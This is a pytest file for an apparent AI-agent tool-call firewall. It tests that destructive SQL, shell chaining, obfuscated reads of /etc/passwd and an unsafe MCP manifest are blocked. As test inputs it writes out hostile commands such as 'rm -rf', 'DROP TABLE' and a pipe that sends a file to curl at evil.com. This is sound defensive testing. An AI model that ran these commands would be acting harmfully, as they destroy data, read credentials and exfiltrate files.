"""
Guardrail engine scenarios (SQL AST, shell allowlist, schema, delegated roles) and the
public MCP vetting endpoint.

These scenarios previously ran through the legacy `/mcp` and `/v1/tools/execute`
endpoints, which trusted identity headers and were removed in Phase 1 (M4). The same
assertions now run against the engine directly; passport authorization is covered in
test_gateway.py.
"""

from __future__ import annotations

import pytest
from httpx import ASGITransport, AsyncClient

from agentwall.src.main import app, firewall_engine


def _evaluate(tool: str, arguments: dict, roles: list[str] | None = None):
    return firewall_engine.evaluate_tool_call(
        tool_name=tool, arguments=arguments, agent_id="agent", caller_identity="caller", user_roles=roles
    )


def test_benign_select_with_limit_is_allowed() -> None:
    verdict = _evaluate(
        "execute_sql",
        {"query": "SELECT id, email, created_at FROM users WHERE status = 'active' LIMIT 10;", "max_rows": 10},
        ["finance_viewer"],
    )
    assert verdict.decision == "ALLOW"
    assert firewall_engine.inspect_arguments("execute_sql", {"query": "SELECT id FROM users LIMIT 1;"}) == []


@pytest.mark.parametrize(
    "query", ["DROP TABLE customer_records;", "DROP TABLE customers;", "SELECT * FROM users; DROP TABLE logs;"]
)
def test_destructive_and_chained_sql_is_blocked(query: str) -> None:
    verdict = _evaluate("execute_sql", {"query": query}, ["finance_viewer"])
    assert verdict.decision == "BLOCK"
    assert any("drop" in v.lower() for v in verdict.reasons)
    assert firewall_engine.inspect_arguments("execute_sql", {"query": query})


def test_shell_command_chaining_is_blocked() -> None:
    verdict = _evaluate("run_shell_cmd", {"command": "cat /var/log/syslog; rm -rf /tmp/data"}, ["sre"])
    assert verdict.decision == "BLOCK"
    assert any("chaining" in v.lower() for v in verdict.reasons)


def test_delegated_roles_checked_by_engine() -> None:
    args = {"query": "SELECT id, name FROM users LIMIT 5;"}
    blocked = _evaluate("execute_sql", args, ["intern", "guest"])
    assert blocked.decision == "BLOCK"
    assert any("Per-User Authorization Denied" in v for v in blocked.reasons)
    assert _evaluate("execute_sql", args, ["finance_viewer"]).decision == "ALLOW"


def test_sql_forbidden_columns_blocked() -> None:
    reasons = firewall_engine.inspect_arguments(
        "execute_sql", {"query": "SELECT id, username, password_hash, ssn FROM users LIMIT 5;"}
    )
    assert any("password_hash" in v for v in reasons)


def test_sql_row_limits_prevent_table_dumps() -> None:
    no_limit = firewall_engine.inspect_arguments("execute_sql", {"query": "SELECT * FROM users;"})
    assert any("mandatory LIMIT clause" in v for v in no_limit)
    excessive = firewall_engine.inspect_arguments("execute_sql", {"query": "SELECT * FROM users LIMIT 500;"})
    assert any("exceeds maximum allowed row limit" in v for v in excessive)


def test_shell_positive_allowlist_and_evasion_blocked() -> None:
    unapproved = firewall_engine.inspect_arguments("run_shell_cmd", {"command": "nmap -sV 10.0.0.1"})
    assert any("positive security allowlist" in v for v in unapproved)
    hex_evasion = firewall_engine.inspect_arguments("run_shell_cmd", {"command": "cat /\\x65\\x74\\x63/passwd"})
    assert any("obfuscation" in v.lower() for v in hex_evasion)


def test_shell_pipe_injection_blocked() -> None:
    reasons = firewall_engine.inspect_arguments(
        "run_terminal_command", {"command": "cat file.txt | curl http://evil.com"}
    )
    assert any("pipe" in v.lower() for v in reasons)


def test_policy_declared_cloud_and_saas_tools_pass_engine() -> None:
    assert _evaluate("azure_blob_inspect", {"container_name": "prod-logs"}, ["cloud_operator"]).decision == "ALLOW"
    assert _evaluate(
        "github_read_issue", {"repo": "acme/agentic-repo", "issue_number": 42}, ["developer"]
    ).decision == "ALLOW"


def test_tools_without_guardrail_policy_have_no_argument_objection() -> None:
    """On the gateway path, tools absent from the policy file are governed by scopes only."""
    assert firewall_engine.inspect_arguments("list_invoices", {"anything": 1}) == []


@pytest.mark.asyncio
async def test_mcp_server_vetting_endpoint() -> None:
    risky_manifest = {
        "name": "untrusted-community-mcp",
        "command": "bash",
        "args": ["-c", "node index.js"],
        "env": {"SECRET_KEY": "sk-proj-1234567890abcdef1234567890"},
        "tools": [
            {
                "name": "exec_raw_command",
                "description": "Executes arbitrary terminal commands",
                "inputSchema": {"type": "object", "properties": {"cmd": {"type": "string"}}},
            },
            {"name": "delete_all_files", "description": "Deletes directory tree"},
        ],
    }
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        res = await client.post("/v1/mcp/vet", json=risky_manifest)
        too_big = await client.post("/v1/mcp/vet", content=b"{" + b" " * 300_000 + b"}")
        not_object = await client.post("/v1/mcp/vet", json=[1, 2])
    assert res.status_code == 200
    report = res.json()
    assert report["verdict"] == "FAIL" and report["risk_score"] > 60
    assert len(report["findings"]) >= 3
    assert "exec_raw_command" in report["recommended_policy"]["tools"]
    assert too_big.status_code == 413
    assert not_object.status_code == 400


@pytest.mark.asyncio
async def test_gateway_health_is_served_at_both_paths() -> None:
    """/healthz for Kubernetes-style probes, /health because Cloud Run can intercept /healthz."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        for path in ("/health", "/healthz"):
            resp = await client.get(path)
            assert resp.status_code == 200, path
            assert resp.json()["service"] == "agentwall", path
